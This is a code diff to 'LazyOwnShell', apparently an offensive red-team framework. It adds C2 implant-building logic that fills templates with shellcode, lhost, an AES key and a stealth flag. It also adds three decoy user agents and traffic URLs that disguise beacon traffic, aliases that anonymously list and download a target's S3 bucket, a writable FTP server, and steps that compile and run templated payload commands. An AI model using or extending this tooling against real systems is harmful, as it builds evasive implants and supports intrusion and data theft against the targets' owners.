@@ -38,6 +38,12 @@ with open('payload.json', 'r') as file:
     start_pass = config.get("start_pass")
     domain = config.get("domain")
     dnswordlist = config.get("dnswordlist")
+    user_agent_1 = config.get("user_agent_1")
+    user_agent_2 = config.get("user_agent_2")
+    user_agent_3 = config.get("user_agent_3")
+    url_trafic_1 = config.get("url_trafic_1")
+    url_trafic_2 = config.get("url_trafic_2")
+    url_trafic_3 = config.get("url_trafic_3")
     
 class LazyOwnShell(cmd2.Cmd):
     """
@@ -135,6 +141,7 @@ class LazyOwnShell(cmd2.Cmd):
         "enabled_search_by_hidden_pids": "sh sudo echo 0 > /proc/sys/kernel/ftrace_enabled",
         "enabled_ftrace": "sh sudo sysctl kernel.ftrace_enabled=1",
         "event_trace": "sh sudo cat /sys/kernel/debug/tracing/trace",
+        "ftpd": "sh cd sessions && python3 -m pyftpdlib -p 2121 -w",
         "ftpsniff": "run lazyftpsniff",
         "gdb": "set debug true",
         "halt": "sh sudo shutdown -h now",
@@ -181,6 +188,8 @@ class LazyOwnShell(cmd2.Cmd):
         "tor": "sh sudo bash sessions/tor.sh",
         "trace": "sh sudo cat /sys/kernel/tracing/trace",
         "touched_functions": "sh sudo cat /sys/kernel/tracing/touched_functions",
+        "s3_annon_enum_aws": f"sh aws s3 ls s3://{domain}/ --no-sign-request --region us-east-1",
+        "s3_annon_sync_aws": f"sh aws s3 sync s3://{domain}/ sessions/s3 --no-sign-request --region us-east-1",
         "smbd": "sh cd sessions && smbserver.py share . -username test -password test",
         "ses": "sh ls sessions",
         "sniff": "run lazysniff",
@@ -26661,12 +26670,16 @@ class LazyOwnShell(cmd2.Cmd):
             "param": adversary.get("param", ""),
             "shellcode": adversary.get("shellcode", ""),
             "lhost": self.params["lhost"],
+            "username": self.params["lhost"],
+            "line": self.c2_clientid,
+            "user_agent_1": f"{user_agent_1}",
+            "user_agent_2": f"{user_agent_2}",
+            "user_agent_3": f"{user_agent_3}",
+            "url_trafic_1": f"{url_trafic_1}",
+            "url_trafic_2": f"{url_trafic_2}",
+            "url_trafic_3": f"{url_trafic_3}",
+            "{stealth}": "True",
         }
-
-        command = replace_placeholders(adversary["command"], replacements)
-        if adversary.get("encoder") == "base64":
-            replacements["base64_command"] = base64.b64encode(command.encode()).decode()
-
         replacements.update({
             "lport": self.params["lport"],
             "username": self.params["c2_user"],
@@ -26677,6 +26690,16 @@ class LazyOwnShell(cmd2.Cmd):
             "useragent": self.params["user_agent_lin"] if adversary["target_os"] == "linux" else self.params["user_agent_win"],
             "key": AES_KEY_hex
         })
+        command = replace_placeholders(adversary["command"], replacements)
+        if adversary.get("encoder") == "base64":
+            replacements["base64_command"] = base64.b64encode(command.encode()).decode()
+        if adversary.get("replace_command"):
+            replace_command = replace_placeholders(adversary.get("replace_command"), replacements)
+            self.cmd(replace_command)
+        if adversary.get("compile"):
+            compile = replace_placeholders(adversary.get("compile"), replacements)
+            self.cmd(compile)
+
 
         self._patch_template_if_needed(adversary, path, replacements)
 
@@ -26729,7 +26752,7 @@ class LazyOwnShell(cmd2.Cmd):
             with open(template_path, 'r') as f:
                 content = f.read()
                 for key, val in replacements.items():
-                    content = content.replace(f"{{{key}}}", val)
+                    content = content.replace(f"{{{key}}}", str(val))
             with open(template_path, 'w') as f:
                 f.write(content)
 
@@ -26757,6 +26780,7 @@ class LazyOwnShell(cmd2.Cmd):
     def _execute_commands(self, confirm, remote_cmds):
         if confirm == 'l':
             for cmd in remote_cmds:
+                self.display_toastr(cmd)
                 subprocess.run(cmd + " 2>/dev/null", shell=True)
                 time.sleep(1)
         elif confirm == 'r':
